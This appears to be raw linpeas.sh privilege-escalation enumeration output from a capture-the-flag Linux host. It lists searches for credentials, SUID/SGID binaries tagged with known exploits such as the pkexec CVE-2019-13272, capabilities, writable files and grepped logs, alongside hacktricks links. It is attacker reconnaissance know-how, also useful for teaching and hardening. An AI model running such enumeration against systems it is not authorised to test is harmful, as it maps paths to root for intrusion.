[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
krb5.conf Not Found
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
No Sockets found in /run/screen/S-admin.

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file
Found readable /etc/cloud/cloud.cfg
     lock_passwd: True

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files

[+] Searching IRSSI files

[+] Searching Keyring files
Keyring folder: /usr/share/keyrings
/usr/share/keyrings:
total 36
-rw-r--r-- 1 root root 7399 Sep 17  2018 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root    0 Jan 17  2018 ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 ubuntu-master-keyring.gpg

[+] Searching Filezilla sites file

[+] Searching backup-manager files


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7713/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7713/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/6350/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/6350/bin/ping
-rwsr-sr-x 1 root   root             18K Jul 15  2016 /usr/bin/run-mailcap
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-- 1 root   systemd-resolve  42K Jan 12  2017 /snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             19K Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root   root             63K Mar  9  2017 /bin/ping
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root             53K May 17  2017 /snap/core/6350/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             74K May 17  2017 /snap/core/6350/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K May 17  2017 /snap/core/6350/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K May 17  2017 /snap/core/6350/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             39K May 17  2017 /snap/core/6350/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K May 17  2017 /snap/core/6350/bin/su
-rwsr-xr-x 1 root   root            134K Jul  4  2017 /snap/core/6350/usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root            146K Jan 18  2018 /usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root             59K Jan 25  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             37K Jan 25  2018 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             40K Jan 25  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             37K Jan 25  2018 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             75K Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             44K Jan 25  2018 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Jan 25  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             44K Jan 25  2018 /bin/su
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root   root             27K May 16  2018 /snap/core/6350/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K May 16  2018 /snap/core/6350/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/7713/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/6350/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root             27K Oct 15  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             43K Oct 15  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            419K Nov  5  2018 /snap/core/6350/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-sr-x 1 root   root             97K Jan 29  2019 /snap/core/6350/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/7713/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root   root             99K Mar 15  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/7713/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/7713/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7713/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/7713/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/7713/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7713/bin/su
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root   root             27K May 15  2019 /snap/core/7713/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K May 15  2019 /snap/core/7713/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            134K Jun 10  2019 /snap/core/7713/usr/bin/sudo  --->  /sudo$
-rwsr-sr-- 1 root   admin            11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-rwsr-sr-x 1 root   root            105K Aug 30  2019 /snap/core/7713/usr/lib/snapd/snap-confine

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/7713/usr/bin/mail-unlock
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/7713/usr/bin/mail-touchlock
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/7713/usr/bin/mail-lock
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/6350/usr/bin/mail-unlock
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/6350/usr/bin/mail-touchlock
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/6350/usr/bin/mail-lock
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   mail             15K Dec  7  2013 /snap/core/7713/usr/bin/dotlockfile
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   mail             15K Dec  7  2013 /snap/core/6350/usr/bin/dotlockfile
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   utmp             10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   systemd-network  36K Apr  5  2016 /snap/core/7713/usr/bin/crontab
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   systemd-network  36K Apr  5  2016 /snap/core/6350/usr/bin/crontab
./linpeas.sh: 2265: [: -rwsr-sr-x: unexpected operator
-rwsr-sr-x 1 root   root             18K Jul 15  2016 /usr/bin/run-mailcap
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           23K May 17  2017 /snap/core/6350/usr/bin/expiry
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           61K May 17  2017 /snap/core/6350/usr/bin/chage
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   crontab          39K Nov 16  2017 /usr/bin/crontab
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   tty              14K Jan 17  2018 /usr/bin/bsd-write
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           23K Jan 25  2018 /usr/bin/expiry
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           71K Jan 25  2018 /usr/bin/chage
./linpeas.sh: 2265: [: -rwsr-sr-x: unexpected operator
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   mlocate          43K Mar  1  2018 /usr/bin/mlocate
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           34K Apr  5  2018 /sbin/unix_chkpwd
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           34K Apr  5  2018 /sbin/pam_extrausers_chkpwd
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/7713/sbin/unix_chkpwd
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/7713/sbin/pam_extrausers_chkpwd
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/6350/sbin/unix_chkpwd
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/6350/sbin/pam_extrausers_chkpwd
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   tty              27K May 16  2018 /snap/core/6350/usr/bin/wall
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   tty              31K Oct 15  2018 /usr/bin/wall
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   crontab         351K Nov  5  2018 /snap/core/6350/usr/bin/ssh-agent
./linpeas.sh: 2265: [: -rwsr-sr-x: unexpected operator
-rwsr-sr-x 1 root   root             97K Jan 29  2019 /snap/core/6350/usr/lib/snapd/snap-confine
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   ssh             355K Mar  4  2019 /usr/bin/ssh-agent
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   crontab         351K Mar  4  2019 /snap/core/7713/usr/bin/ssh-agent
./linpeas.sh: 2265: [: -rwsr-sr-x: unexpected operator
-rwsr-sr-x 1 root   root             99K Mar 15  2019 /usr/lib/snapd/snap-confine
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           23K Mar 25  2019 /snap/core/7713/usr/bin/expiry
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   shadow           61K Mar 25  2019 /snap/core/7713/usr/bin/chage
./linpeas.sh: 2265: [: -rwxr-sr-x: unexpected operator
-rwxr-sr-x 1 root   tty              27K May 15  2019 /snap/core/7713/usr/bin/wall
./linpeas.sh: 2265: [: -rwsr-sr--: unexpected operator
-rwsr-sr-- 1 root   admin            11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
./linpeas.sh: 2265: [: -rwsr-sr-x: unexpected operator
-rwsr-sr-x 1 root   root            105K Aug 30  2019 /snap/core/7713/usr/lib/snapd/snap-confine

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities

[+] Files with ACLs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
files with acls in searched folders Not Found

[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

[+] Unexpected folders in root
/lost+found

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
total 36
drwxr-xr-x  2 root root 4096 Sep 28  2019 .
drwxr-xr-x 95 root root 4096 Oct 10  2019 ..
-rw-r--r--  1 root root   96 Aug 19  2018 01-locale-fix.sh
-rw-r--r--  1 root root  825 Feb  3  2019 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root  873 Oct  3  2018 Z99-cloudinit-warnings.sh
-rwxr-xr-x  1 root root 3417 Oct  3  2018 Z99-cloud-locale-test.sh

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d

[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read opasswd file? ............. No
[+] Can I write in network-scripts? ...... No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 30)
/home

[+] Searching folders owned by me containing others files on it

[+] Readable files belonging to root and readable by me but not world readable

[+] Modified interesting files in the last 5mins (limit 100)
/var/log/syslog
/var/log/journal/8f85cc7d42ec4b5e8c588f2d82076304/system.journal
/var/log/journal/8f85cc7d42ec4b5e8c588f2d82076304/system@13050eb9dd7f490583c7ff4df974cd9a-0000000000006bec-0005b5fed1e27f10.journal
/var/log/journal/8f85cc7d42ec4b5e8c588f2d82076304/user-4000000000.journal
/var/log/journal/8f85cc7d42ec4b5e8c588f2d82076304/user-4000000000@6e14a6b1bd6d40f39961668db5a34175-000000000000269f-00059397bff285d4.journal
/var/log/journal/8f85cc7d42ec4b5e8c588f2d82076304/user-1000.journal
/var/log/auth.log
/var/log/kern.log
/home/admin/.config/lxc/config.yml
/home/admin/.gnupg/pubring.kbx
/home/admin/.gnupg/trustdb.gpg

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation

[+] Files inside /home/admin/ (limit 20)
total 320
drwxr-xr-x 4 admin admin   4096 Dec  9 02:40 .
drwxr-xr-x 4 root  root    4096 Sep 27  2019 ..
lrwxrwxrwx 1 admin admin      9 Sep 27  2019 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 admin admin   3771 Apr  4  2018 .bashrc
drwxr-x--- 3 admin admin   4096 Dec  9 02:37 .config
drwx------ 2 admin admin   4096 Dec  9 02:40 .gnupg
-rwxrwxr-x 1 admin admin 293889 Dec  9 02:30 linpeas.sh
-rw-r--r-- 1 admin admin    807 Apr  4  2018 .profile
-r-------- 1 admin admin     33 Dec  8 22:38 user.txt

[+] Files inside others home (limit 20)
/home/mango/.bash_logout
/home/mango/.profile
/home/mango/.bashrc

[+] Searching installed mail applications

[+] Mails (limit 50)

[+] Backup files?
-rw-r--r-- 1 root root 2765 Feb 14  2019 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 7857 Sep 12  2019 /lib/modules/4.15.0-64-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 Sep 12  2019 /lib/modules/4.15.0-64-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 35464 Oct 10  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 0 Sep 12  2019 /usr/src/linux-headers-4.15.0-64-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Sep 12  2019 /usr/src/linux-headers-4.15.0-64-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217384 Sep 12  2019 /usr/src/linux-headers-4.15.0-64-generic/.config.old
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 11755 Sep 28  2019 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2746 Apr 12  2018 /usr/share/man/man8/vgcfgbackup.8.gz

[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /var/lib/mlocate/mlocate.db: regular file, no read permission

[+] Web files?(output limit)
/var/www/:
total 20K
drwxr-xr-x  5 root root 4.0K Sep 27  2019 .
drwxr-xr-x 14 root root 4.0K Sep 27  2019 ..
drwxr-xr-x  2 root root 4.0K Sep 27  2019 html
drwxr-xr-x  2 root root 4.0K Sep 27  2019 live
drwxr-xr-x  3 root root 4.0K Sep 27  2019 staging

/var/www/html:
total 8.0K

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 admin admin 3771 Apr  4  2018 /home/admin/.bashrc
-rw-r--r-- 1 admin admin 807 Apr  4  2018 /home/admin/.profile
lrwxrwxrwx 1 mango mango 9 Sep 27  2019 /home/mango/.bash_history -> /dev/null
Searching possible passwords inside /home/mango/.bash_history (limit 100)

-rw-r--r-- 1 mango mango 3771 Apr  4  2018 /home/mango/.bashrc
-rw-r--r-- 1 root root 3106 Aug  6  2018 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2889 Dec  4  2017 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 2778 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)

[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
-rw-r--r-- 1 root root 207 Sep 27  2019 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 6389 Sep 27  2019 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 437 Feb 14  2019 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 61440 Sep 28  2019 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 594022 Sep 27  2019 /var/backups/dpkg.status.0

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/admin
/home/admin/.bash_logout
/home/admin/.bashrc
/home/admin/.config
/home/admin/.config/lxc
/home/admin/.config/lxc/config.yml
/home/admin/.gnupg
/home/admin/.gnupg/pubring.kbx
/home/admin/.gnupg/trustdb.gpg
/home/admin/linpeas.sh
/home/admin/.profile
/home/admin/user.txt
/run/lock
/run/screen
/run/screen/S-admin
/snap/core/6350/run/lock
/snap/core/6350/tmp
/snap/core/6350/var/tmp
/snap/core/7713/run/lock
/snap/core/7713/tmp
/snap/core/7713/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-4000000000
/tmp/.X11-unix
/var/crash
/var/crash/.lock
/var/crash/_usr_bin_pkttyagent.4000000000.crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mongod.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-6350.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-7713.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/swap.img.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/uuidd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/vgauth.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group admin:
/home/admin/linpeas.sh
/home/admin/.config/lxc/config.yml

[+] Searching passwords in config PHP files

[+] Finding IPs inside logs (limit 70)
      4 /var/log/wtmp:172.16.118.227
      3 /var/log/wtmp:172.16.118.230
      2 /var/log/wtmp:192.168.142.138
      1 /var/log/wtmp:10.10.14.8

[+] Finding passwords inside logs (limit 70)
Binary file /var/log/journal/8f85cc7d42ec4b5e8c588f2d82076304/user-4000000000.journal matches
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
/var/log/cloud-init.log:2019-09-27 13:54:11,497 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
/var/log/cloud-init.log:2019-09-27 13:54:11,556 - cc_set_passwords.py[DEBUG]: Restarted the ssh daemon.
/var/log/cloud-init.log:2019-09-27 16:32:38,921 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-09-27 16:43:26,567 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-09-28 04:08:17,069 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-09-28 14:44:14,722 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-09-28 15:22:10,906 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-09-28 15:34:16,661 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
